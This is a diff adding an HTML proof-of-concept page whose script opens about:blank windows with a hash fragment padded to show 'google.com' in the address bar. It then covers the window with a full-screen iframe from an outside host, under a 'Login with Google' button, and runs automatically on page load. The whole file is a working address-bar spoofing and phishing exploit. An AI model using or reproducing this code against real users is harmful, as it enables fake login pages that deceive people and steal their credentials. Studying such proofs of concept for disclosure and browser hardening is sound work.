@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+
+var v='';
+        function poc() {
+// Opening first about:blank page
+v=window.open('about:blank');
+
+// Wait a little and open a second about:blank page with a hash fragment
+setTimeout(()=>{
+v.document.body.innerHTML=`
+<img src=x onerror='var c=window.open("about:blank#.         google.com      \u2b1e");
+c.document.body.innerHTML=&#x27;<iframe src="https://pwr.wtf/arc/5.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>&#x27;'>
+`
+},10);
+        }
+poc();
+    </script>
+</head>
+<body>
+        <h1>
+        <center><br><br><br><button style=font-size:30px onclick=poc()>Login with Google</button></center>
+        </h1>
+</body>
+</html>
